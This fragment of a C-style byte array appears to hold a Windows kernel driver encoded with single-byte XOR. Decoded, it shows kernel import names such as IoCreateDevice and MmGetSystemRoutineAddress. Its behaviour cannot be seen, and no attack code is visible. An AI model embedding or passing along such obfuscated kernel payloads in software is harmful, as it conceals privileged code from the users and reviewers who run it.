	0xbe, 0xe9, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0x96, 0xe9, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xa, 0xe8, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0x1, 0xdf, 0x79, 0xb3,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe0, 0xe2, 0xe2, 0xe2, 0xac, 0xe2, 0xe2, 0xe2, 0xbe, 0xe1, 0xe2, 0xe2, 0xbe, 0xe1, 0xe2, 0xe2, 0xb0, 0xb1, 0xa6, 0xb1, 0xd3, 0x8b, 0xd8, 0x33, 0x6a, 0x66, 0x6c, 0xad, 0x61, 0x51, 0x9d, 0x5e, 0x2f, 0xcc, 0x3b, 0xfe,
	0xf5, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xaa, 0xb5, 0xaa, 0x61, 0xe, 0xa2, 0xae, 0x69, 0x23, 0xaa, 0x6f, 0xee, 0xc6, 0xaa, 0xc9, 0x28, 0xed, 0x55, 0xe0, 0x84,
	0x6b, 0xe6, 0xf3, 0xaa, 0x61, 0x20, 0xe0, 0x84, 0x67, 0x22, 0x97, 0x12, 0xd1, 0x1d, 0xaa, 0x6f, 0xf6, 0xc6, 0x84, 0xa3, 0x5b, 0xb7, 0xb7, 0x84, 0xdb, 0xde, 0xc6, 0x96, 0x90, 0xed, 0x55, 0xe8, 0x84, 0xa3, 0x23, 0x3, 0xe0, 0xa6, 0x69, 0x33,
	0x84, 0xa6, 0xe1, 0x2d, 0xa3, 0x23, 0x8, 0xe4, 0xa3, 0x6f, 0xa0, 0x1d, 0x61, 0x1a, 0xe0, 0x95, 0xb4, 0xa3, 0xd0, 0x2b, 0x84, 0xd1, 0x22, 0xa2, 0xc8, 0x2d, 0xa3, 0xc8, 0x28, 0x84, 0x61, 0x3, 0xdd, 0x84, 0x61, 0x1b, 0xe8, 0x91, 0xe7, 0x6f,
	0xa3, 0xd2, 0x9, 0xeb, 0x84, 0x61, 0x1b, 0xc6, 0x91, 0xeb, 0x6f, 0xa3, 0xd5, 0x84, 0x61, 0x1b, 0xc6, 0x90, 0xeb, 0x84, 0x61, 0x1b, 0xdc, 0x91, 0xe1, 0x6f, 0xa3, 0xdf, 0x84, 0x61, 0x1b, 0xdc, 0xa3, 0x58, 0xcc, 0xe2, 0xe2, 0xe2, 0x84, 0xa3,
	0xed, 0xa6, 0x20, 0x84, 0x67, 0x22, 0x96, 0xed, 0x84, 0x6b, 0xe0, 0xaa, 0x61, 0x20, 0xe0, 0x1d, 0x25, 0x84, 0x61, 0xd8, 0xe2, 0x97, 0x6c, 0xd1, 0x22, 0xab, 0x69, 0x1a, 0xaa, 0x6f, 0xf6, 0xc6, 0xaa, 0x6f, 0xaa, 0x1d, 0x84, 0x10, 0x4d, 0xd1,
	0x2b, 0xed, 0x55, 0xe6, 0xe8, 0xaa, 0x61, 0x23, 0xe0, 0x84, 0x67, 0x22, 0x84, 0x6b, 0xa6, 0xed, 0x1e, 0x97, 0xc, 0xab, 0x69, 0x22, 0xaa, 0x61, 0x26, 0xa2, 0xbd, 0x21, 0xaa, 0xb1, 0xaa, 0x61, 0xe, 0xd2, 0xaa, 0x69, 0xbb, 0xea, 0xa7, 0xd1,
	0x22, 0xae, 0x6f, 0xff, 0x92, 0xe1, 0xe2, 0xe2, 0xaa, 0x6f, 0xe7, 0x23, 0xe0, 0xe2, 0xe2, 0xa3, 0xed, 0x55, 0xe6, 0xe2, 0x84, 0xa1, 0x6b, 0xe6, 0xfa, 0xab, 0x61, 0x22, 0xe0, 0x84, 0x67, 0x22, 0x97, 0x4, 0xaa, 0x6f, 0xf7, 0x2d, 0xe6, 0xe2,
	0xe2, 0xab, 0x69, 0x29, 0xa, 0x11, 0x1c, 0x1d, 0x1d, 0xaa, 0x6f, 0xae, 0xc6, 0xc2, 0xab, 0x69, 0x31, 0x1d, 0xf7, 0xa3, 0x1c, 0x1d, 0x1d, 0xaa, 0x6f, 0xae, 0xc6, 0xc2, 0x1d, 0xf7, 0xcc, 0x1c, 0x1d, 0x1d, 0xaa, 0x69, 0x29, 0x1d, 0xf7, 0xb7,
	0x1c, 0x1d, 0x1d, 0xaa, 0x61, 0x26, 0xd2, 0xb9, 0x21, 0x2e, 0x2e, 0x2e, 0xaa, 0xb1, 0xaa, 0x61, 0xe, 0xc2, 0xaa, 0x69, 0x60, 0x5a, 0xe2, 0xe2, 0xe2, 0xd1, 0x2b, 0xaa, 0x69, 0x38, 0x6b, 0xa8, 0xd2, 0xaa, 0x6b, 0xa8, 0xda, 0xda, 0xea, 0x96,
	0xee, 0x62, 0xda, 0xe0, 0x96, 0xe5, 0x25, 0xa0, 0xd2, 0xe0, 0xe2, 0xe2, 0x22, 0xd1, 0x30, 0xaa, 0x69, 0x29, 0x1d, 0xf7, 0x1a, 0x1f, 0x1d, 0x1d, 0x69, 0xa1, 0xd2, 0xaa, 0x61, 0x26, 0xc2, 0xb9, 0x21, 0x2e, 0x2e, 0x2e, 0xaa, 0x6b, 0xae, 0xc6,
	0xea, 0xaa, 0x61, 0xe, 0xaa, 0xaa, 0x69, 0xa6, 0xc6, 0xb2, 0xaa, 0x69, 0xae, 0xc6, 0xb2, 0xaa, 0xdb, 0xaa, 0x1a, 0x96, 0xe6, 0xd1, 0x22, 0x9, 0xab, 0xaa, 0x69, 0xa6, 0xc6, 0xb2, 0xaa, 0x6b, 0xa6, 0xc6, 0xca, 0xaa, 0x69, 0xe7, 0x24, 0x1f,
	0x1d, 0x1d, 0xaa, 0x6b, 0xa6, 0xc6, 0xd2, 0xaa, 0x25, 0xa6, 0xc6, 0xc2, 0xe2, 0xe2, 0xe2, 0xe2, 0xaa, 0x6f, 0xe7, 0xc3, 0xe0, 0xe2, 0xe2, 0xaa, 0x6f, 0xae, 0xc6, 0xc2, 0x1d, 0x32, 0xaa, 0x69, 0xae, 0xc6, 0xd2, 0x1d, 0xb6, 0xc6, 0xca, 0xaa,
	0x6f, 0xe7, 0xc0, 0xe0, 0xe2, 0xe2, 0xaa, 0x6f, 0xae, 0xc6, 0xc2, 0x1d, 0x32, 0x5a, 0xe3, 0xe2, 0xe2, 0xe2, 0xaa, 0x61, 0x26, 0xaa, 0x21, 0x2e, 0xaa, 0xb1, 0xb4, 0xb5, 0xaa, 0x61, 0xe, 0xc2, 0xaa, 0x69, 0x60, 0x5a, 0xe2, 0xe2, 0xe2, 0xaa,
	0x69, 0x98, 0xfa, 0xd1, 0x2b, 0x6b, 0xa8, 0xd2, 0xaa, 0x6b, 0xa8, 0xda, 0x62, 0xda, 0xec, 0xa6, 0x69, 0xaa, 0xf2, 0xa6, 0x69, 0xa2, 0xea, 0xaa, 0x69, 0x38, 0x69, 0xb2, 0xfa, 0x96, 0xeb, 0x25, 0xa1, 0xd2, 0xe0, 0xe2, 0xe2, 0x22, 0x9, 0xbc,
	0xa3, 0x59, 0xa6, 0xc2, 0xe3, 0x48, 0x69, 0x23, 0x69, 0x13, 0xa3, 0xd9, 0x31, 0xa3, 0x58, 0xa6, 0xd2, 0xe3, 0x48, 0x96, 0xed, 0xa3, 0xd9, 0x30, 0x97, 0xf3, 0x5a, 0xea, 0xe2, 0xe2, 0xe2, 0x6f, 0x92, 0x1e, 0x9, 0xe5, 0x5c, 0xe6, 0xe2, 0xe2,
	0xe2, 0x69, 0x24, 0xa6, 0xd9, 0x2a, 0x97, 0xc5, 0xa6, 0xd9, 0x24, 0x97, 0xc0, 0xa3, 0xd9, 0x31, 0x96, 0xe8, 0xa3, 0xd9, 0x30, 0x97, 0xec, 0xaa, 0x69, 0xed, 0x9, 0xe0, 0x69, 0xed, 0xa, 0xf3, 0x1d, 0x1d, 0x1d, 0x69, 0x2a, 0x69, 0x24, 0x6b,
	0xed, 0xaa, 0x6b, 0xa1, 0xda, 0x9, 0xe5, 0x25, 0xa1, 0xd2, 0xef, 0xe2, 0xe2, 0x22, 0xd1, 0x30, 0xaa, 0x69, 0x29, 0x1d, 0xf7, 0x3d, 0x1e, 0x1d, 0x1d, 0x69, 0xa1, 0xd2, 0xaa, 0x61, 0x26, 0xc2, 0xbd, 0xbc, 0xb9, 0x21, 0xaa, 0xb1, 0xb5, 0xaa,
	0x61, 0xe, 0x8a, 0xaa, 0x69, 0x3b, 0xaa, 0x6f, 0xdf, 0x51, 0x1b, 0x1d, 0x1d, 0xae, 0x6f, 0xff, 0xce, 0xe0, 0xe2, 0xe2, 0xd1, 0x2b, 0xed, 0x55, 0x66, 0xdb, 0x96, 0xe5, 0xe2, 0xe2, 0x84, 0xa0, 0x6b, 0xe6, 0xfb, 0xaa, 0x61, 0x23, 0xe0, 0x84,
	0x67, 0x22, 0x97, 0x8, 0xaa, 0x6f, 0xf7, 0xef, 0xe1, 0xe2, 0xe2, 0xab, 0x69, 0x29, 0xa, 0xd3, 0x1f, 0x1d, 0x1d, 0xaa, 0x6f, 0xae, 0xc6, 0xa2, 0xab, 0x69, 0x31, 0x1d, 0xf7, 0x9d, 0x1e, 0x1d, 0x1d, 0xae, 0x6f, 0x7e, 0xc6, 0x72, 0xe2, 0xe2,
	0xe2, 0xae, 0x6f, 0xa6, 0xc6, 0xa2, 0xae, 0x6b, 0xbe, 0xc6, 0xd2, 0xa3, 0x5b, 0xe3, 0x48, 0xe2, 0xe2, 0xd1, 0x30, 0xaa, 0x69, 0x29, 0x24, 0xa6, 0xc6, 0xca, 0xe2, 0x25, 0xa6, 0xc6, 0xc2, 0xe2, 0xe2, 0xe2, 0xe2, 0x1d, 0xf7, 0x8d, 0x1e, 0x1d,
	0x1d, 0x67, 0x22, 0xed, 0x6a, 0x6d, 0xe2, 0xe2, 0xe2, 0xd1, 0x2b, 0xae, 0x6f, 0xff, 0x94, 0xe3, 0xe2, 0xe2, 0xed, 0x55, 0x66, 0xdb, 0xba, 0xe5, 0xe2, 0xe2, 0x84, 0xa0, 0x6b, 0xe6, 0xfb, 0xaa, 0x61, 0x23, 0xe0, 0x84, 0x67, 0x22, 0x97, 0x8,
	0xaa, 0x6f, 0xf7, 0x7b, 0xe0, 0xe2, 0xe2, 0xab, 0x69, 0x29, 0xa, 0x5f, 0x1e, 0x1d, 0x1d, 0xaa, 0x6f, 0xae, 0xc6, 0xb2, 0xab, 0x69, 0x31, 0x1d, 0xf7, 0xe9, 0x1e, 0x1d, 0x1d, 0xaa, 0x6f, 0xb6, 0xc6, 0xa2, 0xaa, 0x6f, 0xae, 0xc6, 0xb2, 0x1d,
	0xf7, 0xf1, 0x1e, 0x1d, 0x1d, 0x67, 0x22, 0x69, 0x1a, 0x9b, 0xf2, 0xaa, 0x69, 0x6e, 0xc6, 0x72, 0xe2, 0xe2, 0xe2, 0x1d, 0xf7, 0xed, 0x1e, 0x1d, 0x1d, 0x9, 0xc9, 0xaa, 0x6f, 0xe7, 0x58, 0x1f, 0x1d, 0x1d, 0xaa, 0x6b, 0x61, 0x62, 0xe2, 0xe2,
	0xe2, 0xaa, 0x6b, 0xa1, 0x92, 0xaa, 0x6f, 0xe7, 0xb6, 0x1c, 0x1d, 0x1d, 0xaa, 0x6b, 0x61, 0x2, 0xe2, 0xe2, 0xe2, 0xaa, 0x6f, 0xe7, 0xd0, 0x1f, 0x1d, 0x1d, 0xaa, 0x6b, 0xa1, 0x8a, 0x69, 0x25, 0xaa, 0x61, 0x26, 0x8a, 0xbd, 0xb9, 0x21, 0x2e,
	0xbe, 0xe2, 0xa6, 0xe2, 0x8d, 0xe2, 0x91, 0xe2, 0xa6, 0xe2, 0x87, 0xe2, 0x94, 0xe2, 0x8b, 0xe2, 0x81, 0xe2, 0x87, 0xe2, 0x91, 0xe2, 0xbe, 0xe2, 0xe2, 0xe2, 0x2e, 0x2e, 0xbe, 0xe2, 0xa6, 0xe2, 0x87, 0xe2, 0x94, 0xe2, 0x8b, 0xe2, 0x81, 0xe2,
	0x87, 0xe2, 0xbe, 0xe2, 0xe2, 0xe2, 0x2e, 0x2e, 0x18, 0xed, 0xc2, 0x2, 0xaa, 0x6b, 0xe3, 0xaa, 0xc7, 0x1d, 0x1d, 0xd, 0x1d, 0xed, 0xc0, 0x2, 0x21, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xaa, 0x69, 0xe3, 0xed, 0xc0, 0x2, 0x19, 0x21,
	0xe3, 0xe4, 0xe0, 0xe2, 0xe4, 0x90, 0xe0, 0x92, 0xe3, 0xe4, 0xe0, 0xe2, 0xe4, 0xb0, 0xe0, 0xd2, 0xe3, 0xe4, 0xe0, 0xe2, 0xe4, 0xd0, 0xe0, 0xd2, 0xe3, 0xeb, 0xe3, 0xe2, 0xeb, 0x60, 0xe2, 0xe2, 0xe3, 0xea, 0xe6, 0xe2, 0xea, 0xd0, 0xe6, 0x92,
	0xe1, 0x82, 0xe0, 0xd2, 0xe3, 0xe5, 0xe1, 0xe2, 0xe5, 0x20, 0xe1, 0x92, 0xe0, 0xd2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0x4e, 0xe1, 0xe2, 0xe2, 0x9e, 0xe6, 0xe2, 0xe2, 0x4a, 0xe5, 0xe2, 0xe2, 0x9e, 0xe6, 0xe2, 0xe2,
	0x3, 0xe6, 0xe2, 0xe2, 0x52, 0xe5, 0xe2, 0xe2, 0x6, 0xe6, 0xe2, 0xe2, 0xc3, 0xe7, 0xe2, 0xe2, 0x5a, 0xe5, 0xe2, 0xe2, 0xc6, 0xe7, 0xe2, 0xe2, 0x6d, 0xe7, 0xe2, 0xe2, 0x22, 0xe5, 0xe2, 0xe2, 0x72, 0xe7, 0xe2, 0xe2, 0xde, 0xe4, 0xe2, 0xe2,
	0x2a, 0xe5, 0xe2, 0xe2, 0xde, 0xe4, 0xe2, 0xe2, 0xb5, 0xe5, 0xe2, 0xe2, 0x36, 0xe5, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0x65, 0xe2, 0x8, 0xe2, 0x1f, 0xe2, 0x78, 0xe2,
	0xa9, 0xe2, 0x91, 0xe2, 0xb6, 0xe2, 0x46, 0xe2, 0xbe, 0xe2, 0x6d, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xbb, 0xe2, 0x95, 0xe2, 0x53, 0xe2, 0x15, 0xe2, 0x6a, 0xe2, 0x91, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xbb, 0xe2, 0x54, 0xe2, 0x1c, 0xe2, 0x15, 0xe2, 0x2b, 0xe2, 0x50, 0xe2, 0x3f, 0xe2, 0x72, 0xe2, 0x21, 0xe2, 0x39, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0x4a, 0xe8, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0x64, 0xe9, 0xe2, 0xe2, 0xe2, 0xe1, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0x18, 0xe8, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xf0, 0xe9, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xc8, 0xe9, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xa2, 0xe9, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xbe, 0xe9, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0x96, 0xe9, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xa, 0xe8, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xbd, 0xe3, 0xab, 0x8d, 0xa6, 0x87, 0x8e, 0x87,
	0x96, 0x87, 0xa6, 0x87, 0x94, 0x8b, 0x81, 0x87, 0xe2, 0xe2, 0x83, 0xe3, 0xab, 0x8d, 0xa6, 0x87, 0x8e, 0x87, 0x96, 0x87, 0xb1, 0x9b, 0x8f, 0x80, 0x8d, 0x8e, 0x8b, 0x81, 0xae, 0x8b, 0x8c, 0x89, 0xe2, 0xe2, 0xdc, 0xe6, 0xb0, 0x96, 0x8e, 0xab,
	0x8c, 0x8b, 0x96, 0xb7, 0x8c, 0x8b, 0x81, 0x8d, 0x86, 0x87, 0xb1, 0x96, 0x90, 0x8b, 0x8c, 0x85, 0xe2, 0xe2, 0x14, 0xe3, 0xab, 0x8d, 0x84, 0xa1, 0x8d, 0x8f, 0x92, 0x8e, 0x87, 0x96, 0x87, 0xb0, 0x87, 0x93, 0x97, 0x87, 0x91, 0x96, 0xe2, 0xe2,
	0x20, 0xe0, 0xaf, 0x8f, 0xa5, 0x87, 0x96, 0xb1, 0x9b, 0x91, 0x96, 0x87, 0x8f, 0xb0, 0x8d, 0x97, 0x96, 0x8b, 0x8c, 0x87, 0xa3, 0x86, 0x86, 0x90, 0x87, 0x91, 0x91, 0xe2, 0xb7, 0xe3, 0xab, 0x8d, 0xa1, 0x90, 0x87, 0x83, 0x96, 0x87, 0xb1, 0x9b,
	0x8f, 0x80, 0x8d, 0x8e, 0x8b, 0x81, 0xae, 0x8b, 0x8c, 0x89, 0xe2, 0xe2, 0xae, 0xe3, 0xab, 0x8d, 0xa1, 0x90, 0x87, 0x83, 0x96, 0x87, 0xa6, 0x87, 0x94, 0x8b, 0x81, 0x87, 0xe2, 0xe2, 0x8c, 0x96, 0x8d, 0x91, 0x89, 0x90, 0x8c, 0x8e, 0xcc, 0x87,
	0x9a, 0x87, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xb2, 0xff, 0xe2, 0xe2, 0xe2, 0xe0, 0xe0, 0xe2,
	0xd2, 0x60, 0xff, 0xa2, 0xe4, 0xeb, 0xc8, 0x64, 0xaa, 0x64, 0x15, 0xef, 0xe3, 0xe5, 0xe0, 0x42, 0x60, 0xff, 0xd3, 0xd2, 0x60, 0xff, 0xcf, 0xe0, 0xe3, 0xe3, 0xd3, 0xe9, 0xd2, 0xeb, 0xe4, 0xe7, 0xc9, 0xec, 0xe1, 0xe0, 0xf8, 0xe7, 0xe2, 0xd2,
	0xae, 0xe4, 0xe8, 0xc9, 0xe4, 0xe3, 0xe6, 0xe3, 0x60, 0xd5, 0xe0, 0xe3, 0xe6, 0x42, 0xdc, 0xd2, 0xde, 0xd2, 0xf5, 0xe4, 0xe8, 0xc9, 0xe4, 0xe3, 0xe6, 0xe3, 0x60, 0xd5, 0xe0, 0xe3, 0xed, 0xd2, 0xeb, 0xe1, 0xe3, 0xe2, 0x42, 0xe6, 0x40, 0xe0,
	0x62, 0xe2, 0xd2, 0xc3, 0xd2, 0xeb, 0xe4, 0xe7, 0xc9, 0xec, 0xe1, 0xe0, 0xf8, 0xe7, 0xe2, 0xe6, 0xf6, 0xff, 0xfe, 0x4d, 0x25, 0xde, 0x75, 0x24, 0x5e, 0x30, 0xd1, 0xfd, 0x65, 0x95, 0x3b, 0xed, 0x3e, 0x47, 0x93, 0xc7, 0x41, 0x42, 0x60, 0xfa,
	0x69, 0xd2, 0x60, 0xe1, 0xc, 0xd2, 0x60, 0xe1, 0xb5, 0x42, 0xe1, 0xe0, 0xe3, 0xe0, 0xe0, 0xf2, 0x9c, 0x71, 0x9, 0x19, 0x9e, 0x24, 0xac, 0xbb, 0x8, 0xa9, 0x78, 0x95, 0x36, 0xe4, 0x1e, 0xd9, 0xd2, 0xef, 0xe4, 0xeb, 0xc8, 0x64, 0xaa, 0x64,
	0x15, 0xef, 0xe3, 0xe3, 0xe7, 0xe7, 0xe2, 0xd2, 0x63, 0x69, 0xd3, 0xe9, 0xd2, 0xeb, 0xe4, 0xe1, 0xb7, 0xe6, 0xe4, 0xf1, 0xe0, 0xb8, 0xa3, 0xd3, 0xf7, 0xd2, 0xf1, 0xe4, 0xe1, 0xb7, 0xe6, 0xea, 0xf1, 0xee, 0xb5, 0x87, 0x91, 0x96, 0x87, 0x90,
	0x8c, 0xc2, 0xa1, 0x83, 0x92, 0x87, 0xd3, 0xf6, 0xd2, 0xf0, 0xe4, 0xe1, 0xb7, 0xe6, 0xe5, 0xf1, 0xe9, 0xa6, 0x97, 0x90, 0x80, 0x83, 0x8c, 0x94, 0x8b, 0x8e, 0x8e, 0x87, 0xd3, 0xed, 0xd2, 0xef, 0xe4, 0xe1, 0xb7, 0xe6, 0xe8, 0xf1, 0xe4, 0xb6,
	0x8a, 0x83, 0x95, 0x96, 0x87, 0xd3, 0xff, 0xd2, 0xf9, 0xe4, 0xe1, 0xb7, 0xe6, 0xe9, 0xf1, 0xf6, 0xb6, 0x8a, 0x83, 0x95, 0x96, 0x87, 0xc2, 0xa1, 0x87, 0x90, 0x96, 0x8b, 0x84, 0x8b, 0x81, 0x83, 0x96, 0x8b, 0x8d, 0x8c, 0xd3, 0xfd, 0xd2, 0xff,
